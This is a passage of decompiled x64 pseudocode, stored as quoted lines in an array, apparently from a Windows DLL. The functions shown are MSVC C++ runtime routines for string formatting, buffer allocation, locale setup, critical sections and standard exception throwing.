    "    if ( v219 < v220 )",
    "      v212 = v220;",
    "  }",
    "LABEL_489:",
    "  if ( v212 )",
    "  {",
    "    v221 = 101;",
    "    if ( v227 )",
    "      v221 = 112;",
    "    *v156++ = v221;",
    "    if ( v212 < 0 )",
    "      *v156++ = 45;",
    "    v222 = v156;",
    "    v223 = -v212;",
    "    if ( v212 > 0 )",
    "      v223 = v212;",
    "    for ( ; v223; v223 /= 10 )",
    "      *v156++ = v223 % 10 + 48;",
    "    sub_1800111F0(v222, v156);",
    "  }",
    "  *v156 = 0;",
    "  v224 = 10;",
    "  if ( v227 )",
    "    v224 = 16;",
    "  v46 = (v225 << 8) | v224;",
    "LABEL_77:",
    "  if ( v246 > 0xF )",
    "  {",
    "    v47 = v246 + 1;",
    "    v48 = v244[0];",
    "    if ( v246 + 1 >= 0x1000 )",
    "    {",
    "      v47 = v246 + 40;",
    "      v48 = *(_QWORD *)(v244[0] - 8LL);",
    "      if ( (unsigned __int64)(v244[0] - v48 - 8) > 0x1F )",
    "        invalid_parameter_noinfo_noreturn();",
    "    }",
    "    sub_1800116E0(v48, v47);",
    "  }",
    "  return v46;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18000F560(__int64 *a1, __int64 *a2, unsigned __int64 a3, _BYTE *a4, char a5)",
    "{",
    "  char v8; // r9",
    "  char v9; // dl",
    "  _BYTE *v10; // rcx",
    "  unsigned __int64 v11; // rax",
    "  __int64 v12; // rcx",
    "  unsigned __int64 v13; // r15",
    "  void (__fastcall ***v14)(_QWORD, __int64); // rax",
    "  char v15; // cl",
    "  __int64 v16; // rbx",
    "  __int64 v17; // rbp",
    "  unsigned __int64 v18; // rsi",
    "  _QWORD *v19; // r12",
    "  char v20; // al",
    "  _QWORD *v21; // rax",
    "  _QWORD *v22; // rax",
    "  char v23; // al",
    "  __int64 v24; // rcx",
    "  unsigned __int8 *v25; // rdx",
    "  int v26; // eax",
    "  int v27; // ecx",
    "  bool v28; // zf",
    "  char v29; // si",
    "  __int64 v30; // rdx",
    "  unsigned __int8 *v31; // r8",
    "  int v32; // eax",
    "  char v33; // al",
    "  _QWORD *v34; // rdx",
    "  char v35; // cl",
    "  __int64 v36; // rcx",
    "  int *v37; // rdx",
    "  unsigned __int8 **v38; // rcx",
    "  unsigned __int8 *v39; // rdx",
    "  int v40; // eax",
    "  char v41; // al",
    "  unsigned __int64 v42; // rdx",
    "  char *v43; // rax",
    "  char v45; // [rsp+20h] [rbp-98h]",
    "  unsigned int v46; // [rsp+24h] [rbp-94h]",
    "  unsigned __int64 v47; // [rsp+28h] [rbp-90h] BYREF",
    "  __int64 v48; // [rsp+30h] [rbp-88h]",
    "  __int64 v49; // [rsp+38h] [rbp-80h]",
    "  __int64 *v50; // [rsp+40h] [rbp-78h]",
    "  _QWORD v51[3]; // [rsp+48h] [rbp-70h] BYREF",
    "  unsigned __int64 v52; // [rsp+60h] [rbp-58h]",
    "",
    "  v50 = a2;",
    "  v8 = *a4;",
    "  if ( v8 )",
    "  {",
    "    v9 = v8;",
    "    v10 = a4;",
    "    do",
    "    {",
    "      v11 = a3 + 1;",
    "      if ( v9 != v8 )",
    "        v11 = a3;",
    "      a3 = v11;",
    "      v9 = *++v10;",
    "    }",
    "    while ( *v10 );",
    "  }",
    "  sub_180006C20((__int64)v51, a3, 0);",
    "  LOBYTE(v12) = 1;",
    "  v48 = sub_1800101C0(v12);",
    "  v49 = sub_180009900((__int64)&v47);",
    "  v13 = 1;",
    "  if ( v48 )",
    "  {",
    "    v14 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v48 + 16LL))(v48);",
    "    if ( v14 )",
    "      (**v14)(v14, 1);",
    "  }",
    "  v15 = 0;",
    "  v45 = 0;",
    "  v16 = 0;",
    "  v17 = 0;",
    "  v46 = -2;",
    "  v18 = v52;",
    "  v19 = (_QWORD *)v51[0];",
    "  if ( a3 )",
    "  {",
    "    v47 = v52;",
    "    while ( 1 )",
    "    {",
    "      v20 = a4[v16];",
    "      if ( v20 )",
    "      {",
    "        do",
    "        {",
    "          if ( v20 == *a4 )",
    "            break;",
    "          v20 = a4[++v16];",
    "        }",
    "        while ( v20 );",
    "        v15 = v45;",
    "      }",
    "      v21 = v51;",
    "      if ( v18 > 0xF )",
    "        v21 = v19;",
    "      if ( *((_BYTE *)v21 + v17) )",
    "      {",
    "        v22 = v51;",
    "        if ( v18 > 0xF )",
    "          v22 = v19;",
    "        v16 += *((char *)v22 + v17);",
    "        goto LABEL_54;",
    "      }",
    "      v16 += v13;",
    "      v23 = a4[v16];",
    "      if ( v23 == *a4 || !v23 )",
    "      {",
    "        v46 = v17;",
    "LABEL_49:",
    "        v34 = v51;",
    "        if ( v18 > 0xF )",
    "          v34 = v19;",
    "        v35 = 127;",
    "        if ( v13 < 0x7F )",
    "          v35 = v13;",
    "        *((_BYTE *)v34 + v17) = v35;",
    "        v18 = v52;",
    "        v15 = v45;",
    "        v19 = (_QWORD *)v51[0];",
    "        v47 = v52;",
    "        goto LABEL_54;",
    "      }",
    "      if ( sub_18000E050(a1, v50) )",
    "        goto LABEL_49;",
    "      if ( a5 != 1 )",
    "      {",
    "        v29 = (*(__int64 (__fastcall **)(__int64, _QWORD))(*(_QWORD *)v49 + 32LL))(v49, (unsigned __int8)a4[v16]);",
    "        if ( !*((_BYTE *)a1 + 8) )",
    "        {",
    "          v30 = *a1;",
    "          if ( !*a1",
    "            || ((v31 = **(unsigned __int8 ***)(v30 + 56)) == 0 || **(int **)(v30 + 80) <= 0",
    "              ? (v32 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v30 + 48LL))(*a1))",
    "              : (v32 = *v31),",
    "                v32 == -1) )",
    "          {",
    "            *a1 = 0;",
    "          }",
    "          else",
    "          {",
    "            *((_BYTE *)a1 + 9) = v32;",
    "          }",
    "          *((_BYTE *)a1 + 8) = 1;",
    "        }",
    "        v33 = (*(__int64 (__fastcall **)(__int64, _QWORD))(*(_QWORD *)v49 + 32LL))(v49, *((unsigned __int8 *)a1 + 9));",
    "        v27 = 0;",
    "        v28 = v29 == v33;",
    "        v18 = v47;",
    "        goto LABEL_46;",
    "      }",
    "      if ( *((_BYTE *)a1 + 8) )",
    "        goto LABEL_34;",
    "      v24 = *a1;",
    "      if ( !*a1 )",
    "        break;",
    "      v25 = **(unsigned __int8 ***)(v24 + 56);",
    "      if ( v25 && **(int **)(v24 + 80) > 0 )",
    "        v26 = *v25;",
    "      else",
    "        v26 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v24 + 48LL))(v24);",
    "      if ( v26 == -1 )",
    "        break;",
    "      *((_BYTE *)a1 + 9) = v26;",
    "      *((_BYTE *)a1 + 8) = 1;",
    "      v27 = 0;",
    "      v28 = a4[v16] == (unsigned __int8)v26;",
    "LABEL_46:",
    "      LOBYTE(v27) = !v28;",
    "      if ( v27 )",
    "        goto LABEL_49;",
    "      v15 = 1;",
    "      v45 = 1;",
    "LABEL_54:",
    "      if ( ++v17 >= a3 )",
    "      {",
    "        if ( !v15 || sub_18000E050(a1, v50) )",
    "          goto LABEL_66;",
    "        ++v13;",
    "        v36 = *a1;",
    "        if ( !*a1",
    "          || (!**(_QWORD **)(v36 + 56) || (v37 = *(int **)(v36 + 80), *v37 <= 0)",
    "            ? (v40 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v36 + 56LL))(v36))",
    "            : (--*v37, v38 = *(unsigned __int8 ***)(v36 + 56), v39 = *v38, ++*v38, v40 = *v39),",
    "              v40 == -1) )",
    "        {",
    "          *a1 = 0;",
    "          v41 = 1;",
    "        }",
    "        else",
    "        {",
    "          v41 = 0;",
    "        }",
    "        *((_BYTE *)a1 + 8) = v41;",
    "        v46 = -1;",
    "        v15 = 0;",
    "        v45 = 0;",
    "        v16 = 0;",
    "        v17 = 0;",
    "      }",
    "    }",
    "    *a1 = 0;",
    "    *((_BYTE *)a1 + 8) = 1;",
    "LABEL_34:",
    "    v27 = 0;",
    "    v28 = a4[v16] == *((_BYTE *)a1 + 9);",
    "    goto LABEL_46;",
    "  }",
    "LABEL_66:",
    "  if ( v18 > 0xF )",
    "  {",
    "    v42 = v18 + 1;",
    "    v43 = (char *)v19;",
    "    if ( v18 + 1 >= 0x1000 )",
    "    {",
    "      v42 = v18 + 40;",
    "      v19 = (_QWORD *)*(v19 - 1);",
    "      if ( (unsigned __int64)(v43 - (char *)v19 - 8) > 0x1F )",
    "        invalid_parameter_noinfo_noreturn();",
    "    }",
    "    sub_1800116E0(v19, v42);",
    "  }",
    "  return v46;",
    "}",
    "",
    "",
    "unsigned __int64 *__fastcall sub_18000F8D0(",
    "        unsigned __int64 *a1,",
    "        unsigned __int64 a2,",
    "        __int64 a3,",
    "        __int64 a4,",
    "        __int64 a5,",
    "        __int64 a6)",
    "{",
    "  unsigned __int64 v6; // r14",
    "  __int64 v7; // rbx",
    "  unsigned __int64 v9; // rbp",
    "  unsigned __int64 v10; // r15",
    "  unsigned __int64 v11; // rdx",
    "  __int64 v12; // rcx",
    "  unsigned __int64 v13; // rcx",
    "  unsigned __int64 v14; // rdi",
    "  unsigned __int64 v15; // rax",
    "  __int64 v16; // rax",
    "  __int64 v17; // r15",
    "  unsigned __int64 v18; // rbx",
    "  unsigned __int64 v19; // rdx",
    "",
    "  v6 = a1[2];",
    "  v7 = 0x7FFFFFFFFFFFFFFFLL;",
    "  if ( 0x7FFFFFFFFFFFFFFFLL - v6 < a2 )",
    "    std::vector<void *>::_Xlen();",
    "  v9 = a1[3];",
    "  v10 = a2 + v6;",
    "  v11 = (a2 + v6) | 0xF;",
    "  if ( v11 > 0x7FFFFFFFFFFFFFFFLL || (v12 = v9 >> 1, v9 > 0x7FFFFFFFFFFFFFFFLL - (v9 >> 1)) )",
    "  {",
    "    v15 = 0x8000000000000027uLL;",
    "  }",
    "  else",
    "  {",
    "    v7 = v11;",
    "    if ( v11 < v12 + v9 )",
    "      v7 = v12 + v9;",
    "    v13 = v7 + 1;",
    "    if ( v7 == -1 )",
    "    {",
    "      v14 = 0;",
    "      goto LABEL_15;",
    "    }",
    "    if ( v13 < 0x1000 )",
    "    {",
    "      v14 = sub_180011714(v13);",
    "      goto LABEL_15;",
    "    }",
    "    v15 = v7 + 40;",
    "    if ( v7 + 40 < (unsigned __int64)(v7 + 1) )",
    "      Concurrency::cancel_current_task();",
    "  }",
    "  v16 = sub_180011714(v15);",
    "  if ( !v16 )",
    "    goto LABEL_22;",
    "  v14 = (v16 + 39) & 0xFFFFFFFFFFFFFFE0uLL;",
    "  *(_QWORD *)(v14 - 8) = v16;",
    "LABEL_15:",
    "  a1[2] = v10;",
    "  a1[3] = v7;",
    "  v17 = v14 + a6;",
    "  if ( v9 <= 0xF )",
    "  {",
    "    sub_180036160(v14, a5, a6);",
    "    sub_180036160(v17, a1, v6 + 1);",
    "    goto LABEL_21;",
    "  }",
    "  v18 = *a1;",
    "  sub_180036160(v14, a5, a6);",
    "  sub_180036160(v17, v18, v6 + 1);",
    "  v19 = v9 + 1;",
    "  if ( v9 + 1 >= 0x1000 )",
    "  {",
    "    v19 = v9 + 40;",
    "    if ( v18 - *(_QWORD *)(v18 - 8) - 8 <= 0x1F )",
    "    {",
    "      v18 = *(_QWORD *)(v18 - 8);",
    "      goto LABEL_19;",
    "    }",
    "LABEL_22:",
    "    invalid_parameter_noinfo_noreturn();",
    "  }",
    "LABEL_19:",
    "  sub_1800116E0(v18, v19);",
    "LABEL_21:",
    "  *a1 = v14;",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18000FA50(__int64 *a1, __int64 a2)",
    "{",
    "  __int64 v4; // rsi",
    "  __int64 v5; // rcx",
    "  void *v6; // rbx",
    "  _BYTE v8[8]; // [rsp+20h] [rbp-29h] BYREF",
    "  __int64 v9; // [rsp+28h] [rbp-21h]",
    "  char v10; // [rsp+30h] [rbp-19h]",
    "  __int64 v11; // [rsp+38h] [rbp-11h]",
    "  char v12; // [rsp+40h] [rbp-9h]",
    "  __int64 v13; // [rsp+48h] [rbp-1h]",
    "  __int16 v14; // [rsp+50h] [rbp+7h]",
    "  __int64 v15; // [rsp+58h] [rbp+Fh]",
    "  __int16 v16; // [rsp+60h] [rbp+17h]",
    "  __int64 v17; // [rsp+68h] [rbp+1Fh]",
    "  char v18; // [rsp+70h] [rbp+27h]",
    "  __int64 v19; // [rsp+78h] [rbp+2Fh]",
    "  char v20; // [rsp+80h] [rbp+37h]",
    "",
    "  if ( a1 && !*a1 )",
    "  {",
    "    v4 = sub_180011714(16);",
    "    v5 = *(_QWORD *)(a2 + 8);",
    "    if ( v5 )",
    "    {",
    "      v6 = *(void **)(v5 + 40);",
    "      if ( !v6 )",
    "        v6 = (void *)(v5 + 48);",
    "    }",
    "    else",
    "    {",
    "      v6 = &unk_18004477D;",
    "    }",
    "    sub_18000FC70(v8, 0);",
    "    v9 = 0;",
    "    v10 = 0;",
    "    v11 = 0;",
    "    v12 = 0;",
    "    v13 = 0;",
    "    v14 = 0;",
    "    v15 = 0;",
    "    v16 = 0;",
    "    v17 = 0;",
    "    v18 = 0;",
    "    v19 = 0;",
    "    v20 = 0;",
    "    if ( !v6 )",
    "      sub_18000FFD8(\"bad locale name\");",
    "    sub_180010330(v8, v6);",
    "    *(_DWORD *)(v4 + 8) = 0;",
    "    *(_QWORD *)v4 = &MEMORY[0x18003A988];",
    "    *a1 = v4;",
    "    std::_Locinfo::_Locinfo_dtor((struct std::_Locinfo *)v8);",
    "    if ( v19 )",
    "      sub_18001A2CC(v19);",
    "    v19 = 0;",
    "    if ( v17 )",
    "      sub_18001A2CC(v17);",
    "    v17 = 0;",
    "    if ( v15 )",
    "      sub_18001A2CC(v15);",
    "    v15 = 0;",
    "    if ( v13 )",
    "      sub_18001A2CC(v13);",
    "    v13 = 0;",
    "    if ( v11 )",
    "      sub_18001A2CC(v11);",
    "    v11 = 0;",
    "    if ( v9 )",
    "      sub_18001A2CC(v9);",
    "    v9 = 0;",
    "    sub_18000FCE8(v8);",
    "  }",
    "  return 4;",
    "}",
    "",
    "",
    "void  std::vector<void *>::_Xlen()",
    "{",
    "  sub_18000FF90(\"vector too long\");",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18000FC2C(__int64 a1)",
    "{",
    "  int *v2; // rbx",
    "",
    "  if ( !_InterlockedIncrement(dword_18004B000) )",
    "  {",
    "    v2 = (int *)&CriticalSection;",
    "    do",
    "    {",
    "      Mtxinit(v2);",
    "      v2 += 10;",
    "    }",
    "    while ( v2 != &dword_18004C6A0 );",
    "  }",
    "  return a1;",
    "}",
    "",
    "",
    "int *__fastcall sub_18000FC70(int *a1, int a2)",
    "{",
    "  *a1 = a2;",
    "  if ( a2 )",
    "  {",
    "    if ( a2 < 8 )",
    "      EnterCriticalSection(&CriticalSection + a2);",
    "  }",
    "  else",
    "  {",
    "    sub_180020A58();",
    "  }",
    "  return a1;",
    "}",
    "",
    "",
    "int *sub_18000FCAC()",
    "{",
    "  int *result; // rax",
    "  struct _RTL_CRITICAL_SECTION *v1; // rbx",
    "",
    "  result = (int *)(unsigned int)_InterlockedExchangeAdd(dword_18004B000, 0xFFFFFFFF);",
    "  if ( (int)result - 1 < 0 )",
    "  {",
    "    v1 = &CriticalSection;",
    "    do",
    "    {",
    "      DeleteCriticalSection(v1);",
    "      result = &dword_18004C6A0;",
    "      ++v1;",
    "    }",
    "    while ( v1 != (struct _RTL_CRITICAL_SECTION *)&dword_18004C6A0 );",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "void __fastcall sub_18000FCE8(int *a1)",
    "{",
    "  __int64 v1; // rax",
    "",
    "  v1 = *a1;",
    "  if ( !(_DWORD)v1 )",
    "    JUMPOUT(0x180020A74LL);",
    "  if ( (int)v1 < 8 )",
    "    LeaveCriticalSection(&CriticalSection + v1);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18000FD3C(__int64 a1, __int64 a2)",
    "{",
    "  *(_QWORD *)a1 = &off_1800394A8;",
    "  *(_OWORD *)(a1 + 8) = 0;",
    "  sub_1800135A8(a2 + 8);",
    "  *(_QWORD *)a1 = &off_180039500;",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18000FD78(__int64 a1, __int64 a2)",
    "{",
    "  __int64 v4; // [rsp+20h] [rbp-18h] BYREF",
    "  char v5; // [rsp+28h] [rbp-10h]",
    "",
    "  v5 = 1;",
    "  v4 = a2;",
    "  *(_QWORD *)a1 = &off_1800394A8;",
    "  *(_OWORD *)(a1 + 8) = 0;",
    "  sub_1800135A8(&v4);",
    "  *(_QWORD *)a1 = &off_180039500;",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18000FDC0(__int64 a1, __int64 a2)",
    "{",
    "  *(_QWORD *)a1 = &off_1800394A8;",
    "  *(_OWORD *)(a1 + 8) = 0;",
    "  sub_1800135A8(a2 + 8);",
    "  *(_QWORD *)a1 = &off_180039518;",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18000FDFC(__int64 a1, __int64 a2)",
    "{",
    "  __int64 v4; // [rsp+20h] [rbp-18h] BYREF",
    "  char v5; // [rsp+28h] [rbp-10h]",
    "",
    "  v5 = 1;",
    "  v4 = a2;",
    "  *(_QWORD *)a1 = &off_1800394A8;",
    "  *(_OWORD *)(a1 + 8) = 0;",
    "  sub_1800135A8(&v4);",
    "  *(_QWORD *)a1 = &off_180039518;",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18000FE44(__int64 a1, __int64 a2)",
    "{",
    "  *(_QWORD *)a1 = &off_1800394A8;",
    "  *(_OWORD *)(a1 + 8) = 0;",
    "  sub_1800135A8(a2 + 8);",
    "  *(_QWORD *)a1 = &MEMORY[0x1800394E8];",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18000FE80(__int64 a1, __int64 a2)",
    "{",
    "  *(_QWORD *)a1 = &off_1800394A8;",
    "  *(_OWORD *)(a1 + 8) = 0;",
    "  sub_1800135A8(a2 + 8);",
    "  *(_QWORD *)a1 = &off_180039530;",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18000FEBC(__int64 a1, __int64 a2)",
    "{",
    "  __int64 v4; // [rsp+20h] [rbp-18h] BYREF",
    "  char v5; // [rsp+28h] [rbp-10h]",
    "",
    "  v5 = 1;",
    "  v4 = a2;",
    "  *(_QWORD *)a1 = &off_1800394A8;",
    "  *(_OWORD *)(a1 + 8) = 0;",
    "  sub_1800135A8(&v4);",
    "  *(_QWORD *)a1 = &off_180039530;",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18000FF04(__int64 a1, __int64 a2)",
    "{",
    "  __int64 v4; // [rsp+20h] [rbp-18h] BYREF",
    "  char v5; // [rsp+28h] [rbp-10h]",
    "",
    "  v5 = 1;",
    "  v4 = a2;",
    "  *(_QWORD *)a1 = &off_1800394A8;",
    "  *(_OWORD *)(a1 + 8) = 0;",
    "  sub_1800135A8(&v4);",
    "  *(_QWORD *)a1 = &off_180039548;",
    "  return a1;",
    "}",
    "",
    "",
    "void  Concurrency::cancel_current_task(void)",
    "{",
    "  _BYTE pExceptionObject[40]; // [rsp+20h] [rbp-28h] BYREF",
    "",
    "  sub_18000FD1C(pExceptionObject);",
    "  throw (std::bad_alloc *)pExceptionObject;",
    "}",
    "",
    "",
    "void __fastcall  sub_18000FF6C(__int64 a1)",
    "{",
    "  _BYTE pExceptionObject[40]; // [rsp+20h] [rbp-28h] BYREF",
    "",
    "  sub_18000FD78((__int64)pExceptionObject, a1);",
    "  throw (std::invalid_argument *)pExceptionObject;",
    "}",
    "",
    "",
    "void __fastcall  sub_18000FF90(__int64 a1)",
    "{",
    "  _BYTE pExceptionObject[40]; // [rsp+20h] [rbp-28h] BYREF",
    "",
    "  sub_18000FDFC((__int64)pExceptionObject, a1);",
    "  throw (std::length_error *)pExceptionObject;",
    "}",
    "",
    "",
    "void __fastcall  sub_18000FFB4(__int64 a1)",
    "{",
    "  _BYTE pExceptionObject[40]; // [rsp+20h] [rbp-28h] BYREF",
    "",
    "  sub_18000FEBC((__int64)pExceptionObject, a1);",
    "  throw (std::out_of_range *)pExceptionObject;",
    "}",
    "",
    "",
    "void __fastcall  sub_18000FFD8(__int64 a1)",
    "{",
    "  _BYTE pExceptionObject[40]; // [rsp+20h] [rbp-28h] BYREF",
    "",
    "  sub_18000FF04((__int64)pExceptionObject, a1);",
    "  throw (std::runtime_error *)pExceptionObject;",
    "}",
    "",
    "",
    "const char *__fastcall sub_18000FFFC(int a1)",
    "{",
    "  const char *v1; // rax",
    "",
    "  v1 = (const char *)&unk_180039800;",
    "  while ( *(_DWORD *)v1 != a1 )",
    "  {",
    "    v1 += 16;",
    "    if ( v1 == \"success\" )",
    "      return \"unknown error\";",
    "  }",
    "  return (const char *)*((_QWORD *)v1 + 1);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180010024(__int64 a1, char a2)",
    "{",
    "  _BYTE *v3; // rdi",
    "  __int64 v4; // rdi",
    "  __int64 v5; // rax",
    "",
    "  *(_QWORD *)(a1 + 16) = 0;",
    "  *(_QWORD *)(a1 + 24) = 0;",
    "  *(_DWORD *)(a1 + 32) = 0;",
    "  *(_QWORD *)a1 = &off_18003A3E0;",
    "  v3 = &unk_18003A3F8;",
    "  *(_DWORD *)(a1 + 8) = 1;",
    "  *(_BYTE *)(a1 + 36) = a2;",
    "  *(_QWORD *)(a1 + 40) = 0;",
    "  *(_BYTE *)(a1 + 48) = 0;",
    "  do",
    "    ++v3;",
    "  while ( *v3 );",
    "  v4 = v3 - (_BYTE *)&unk_18003A3F8;",
    "  v5 = sub_180020A84(v4 + 1);",
    "  *(_QWORD *)(a1 + 40) = v5;",
    "  if ( v5 )",
    "    sub_180036160(v5, &unk_18003A3F8, v4 + 1);",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 *__fastcall sub_1800100AC(__int64 *a1, _BYTE *a2)",
    "{",
    "  _BYTE *v4; // rcx",
    "  _BYTE *i; // rbx",
    "  _BYTE *v6; // rbx",
    "  __int64 v7; // rax",
    "",
    "  v4 = (_BYTE *)*a1;",
    "  if ( v4 != a2 )",
    "  {",
    "    if ( v4 )",
    "      sub_18001A2CC(v4);",
    "    *a1 = 0;",
    "    if ( a2 )",
    "    {",
    "      for ( i = a2; *i; ++i )",
    "        ;",
    "      v6 = (_BYTE *)(i - a2);",
    "      v7 = sub_180020A84(v6 + 1);",
    "      *a1 = v7;",
    "      if ( v7 )",
    "        sub_180036160(v7, a2, v6 + 1);",
    "    }",
    "  }",
    "  return a1;",
    "}",
    "",
    "",
    "_QWORD *__fastcall sub_180010124(_QWORD *a1, char a2)",
    "{",
    "  __int64 v4; // rcx",
    "",
    "  *a1 = &off_18003A3E0;",
    "  sub_1800102B4();",
    "  v4 = a1[5];",
    "  if ( v4 )",
    "    sub_18001A2CC(v4);",
    "  a1[5] = 0;",
    "  *a1 = &off_18003A3C0;",
    "  if ( (a2 & 1) != 0 )",
    "    sub_1800116E0(a1, 56);",
    "  return a1;",
    "}",
    "",
    "",
    "_QWORD *__fastcall sub_180010180(__int64 a1)",
    "{",
    "  _QWORD *result; // rax",
    "",
    "  result = (_QWORD *)sub_180011714(16);",
    "  if ( result )",
    "  {",
    "    *result = qword_18004C6E8;",
    "    result[1] = a1;",
    "  }",
    "  qword_18004C6E8 = (__int64)result;",
    "  return result;",
    "}",
    "",
    "",
    "__int64 sub_1800101B8()",
    "{",
    "  return qword_18004C6F8;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800101C0(char a1)",
    "{",
    "  __int64 v2; // rbx",
    "  void *v3; // rcx",
    "  _BYTE *v4; // rdi",
    "  __int64 v5; // rdi",
    "  __int64 v6; // rax",
    "  int v8; // [rsp+30h] [rbp+8h] BYREF",
    "",
    "  sub_18000FC70(&v8, 0);",
    "  v2 = qword_18004C6F8;",
    "  if ( !qword_18004C6F8 )",
    "  {",
    "    v2 = sub_1800103B8(0);",
    "    std::locale::_Setgloballocale((void *)v2);",
    "    *(_DWORD *)(v2 + 32) = 63;",
    "    v3 = *(void **)(v2 + 40);",
    "    if ( v3 != &unk_18003A3FC )",
    "    {",
    "      if ( v3 )",
    "        sub_18001A2CC(v3);",
    "      *(_QWORD *)(v2 + 40) = 0;",
    "      v4 = &unk_18003A3FC;",
    "      do",
    "        ++v4;",
    "      while ( *v4 );",
    "      v5 = v4 + 1 - (_BYTE *)&unk_18003A3FC;",
    "      v6 = sub_180020A84(v5);",
    "      *(_QWORD *)(v2 + 40) = v6;",
    "      if ( v6 )",
    "        sub_180036160(v6, &unk_18003A3FC, v5);",
    "    }",
    "    (*(void (__fastcall **)(__int64))(*(_QWORD *)v2 + 8LL))(v2);",
    "    qword_18004C6D8 = v2;",
    "    qword_18004C6A8 = v2;",
    "  }",
    "  if ( a1 )",
    "    (*(void (__fastcall **)(__int64))(*(_QWORD *)v2 + 8LL))(v2);",
    "  sub_18000FCE8(&v8);",
    "  return v2;",
    "}",
    "",
    "",
    "void __fastcall sub_1800102B4(__int64 a1)",
    "{",
    "  __int64 v2; // rdi",
    "  __int64 v3; // rcx",
    "  void (__fastcall ***v4)(_QWORD, __int64); // rax",
    "  int v5; // [rsp+30h] [rbp+8h] BYREF",
    "",
    "  sub_18000FC70(&v5, 0);",
    "  v2 = *(_QWORD *)(a1 + 24);",
    "  while ( v2 )",
    "  {",
    "    --v2;",
    "    v3 = *(_QWORD *)(*(_QWORD *)(a1 + 16) + 8 * v2);",
    "    if ( v3 )",
    "    {",
    "      v4 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v3 + 16LL))(v3);",
    "      if ( v4 )",
    "        (**v4)(v4, 1);",
    "    }",
    "  }",
    "  sub_18001A2CC(*(_QWORD *)(a1 + 16));",
    "  sub_18000FCE8(&v5);",
    "}",
    "",
    "",
    "__int64 *__fastcall sub_180010330(__int64 a1, _BYTE *a2)",
    "{",
    "  _BYTE *v4; // rax",
    "",
    "  v4 = (_BYTE *)sub_180020D68(0, 0);",
    "  if ( !v4 )",
    "    v4 = &unk_18004477D;",
    "  sub_1800100AC((__int64 *)(a1 + 72), v4);",
    "  if ( a2 )",
    "    a2 = (_BYTE *)sub_180020D68(0, a2);",
    "  if ( !a2 )",
    "    a2 = &unk_18003A3F8;",
    "  return sub_1800100AC((__int64 *)(a1 + 88), a2);",
    "}",
    "",
    "",
    "void __fastcall std::_Locinfo::_Locinfo_dtor(struct std::_Locinfo *a1)",
    "{",
    "  __int64 v1; // rdx",
    "",
    "  v1 = *((_QWORD *)a1 + 9);",
    "  if ( v1 )",
    "    sub_180020D68(0, v1);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800103B8(char a1)",
    "{",
    "  __int64 v2; // rcx",
    "  __int64 result; // rax",
    "",
    "  v2 = sub_180011714(56);",
    "  result = 0;",
    "  if ( v2 )",
    "    return sub_180010024(v2, a1);",
    "  return result;",
    "}",
    "",
    "",
    "void __fastcall std::locale::_Setgloballocale(__int64 a1)",
    "{",
    "  if ( !byte_18004C700 )",
    "  {",
    "    byte_18004C700 = 1;",
    "    sub_180011308(sub_180010458);",
    "  }",
    "  qword_18004C6F8 = a1;",
    "}",
    "",
    "",
    "void __fastcall sub_18001041C(__int64 *a1)",
    "{",
    "  __int64 v1; // rcx",
    "  void (__fastcall ***v2)(_QWORD, __int64); // rax",
    "",
    "  v1 = *a1;",
    "  if ( v1 )",
    "  {",
    "    v2 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v1 + 16LL))(v1);",
    "    if ( v2 )",
    "      (**v2)(v2, 1);",
    "  }",
    "}",
    "",
    "",
    "void sub_180010458()",
    "{",
    "  int v0; // [rsp+30h] [rbp+8h] BYREF",
    "",
    "  sub_18000FC70(&v0, 0);",
    "  sub_18001041C(&qword_18004C6F8);",
    "  qword_18004C6F8 = 0;",
    "  sub_18000FCE8(&v0);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001048C(__int64 a1)",
    "{",
    "  __int64 v2; // rax",
    "  _OWORD *v3; // rax",
    "  _OWORD *v4; // rcx",
    "  __int64 v5; // rdx",
    "  __int64 v6; // r8",
    "  __int128 v7; // xmm1",
    "  __int64 v8; // rax",
    "  __int64 v9; // rcx",
    "",
    "  *(_DWORD *)a1 = sub_180020FF8();",
    "  v2 = sub_18001A730(256);",
    "  *(_QWORD *)(a1 + 8) = v2;",
    "  if ( v2 )",
    "  {",
    "    v3 = (_OWORD *)sub_180020DB4();",
    "    v4 = *(_OWORD **)(a1 + 8);",
    "    v5 = 4;",
    "    v6 = 128;",
    "    do",
    "    {",
    "      *v4 = *v3;",
    "      v4[1] = v3[1];",
    "      v4[2] = v3[2];",
    "      v4[3] = v3[3];",
    "      v4[4] = v3[4];",
    "      v4[5] = v3[5];",
    "      v4[6] = v3[6];",
    "      v4 += 8;",
    "      v7 = v3[7];",
    "      v3 += 8;",
    "      *(v4 - 1) = v7;",
    "      --v5;",
    "    }",
    "    while ( v5 );",
    "    *(_DWORD *)(a1 + 16) = 1;",
    "  }",
    "  else",
    "  {",
    "    v8 = sub_180020DB4();",
    "    *(_DWORD *)(a1 + 16) = 0;",
    "    *(_QWORD *)(a1 + 8) = v8;",
    "  }",
    "  v9 = *(_QWORD *)(sub_180021028(v4, v5, v6) + 8);",
    "  *(_QWORD *)(a1 + 24) = v9;",
    "  if ( v9 )",
    "    *(_QWORD *)(a1 + 24) = sub_1800216F0();",
    "  return a1;",
    "}",
    "",
    "",
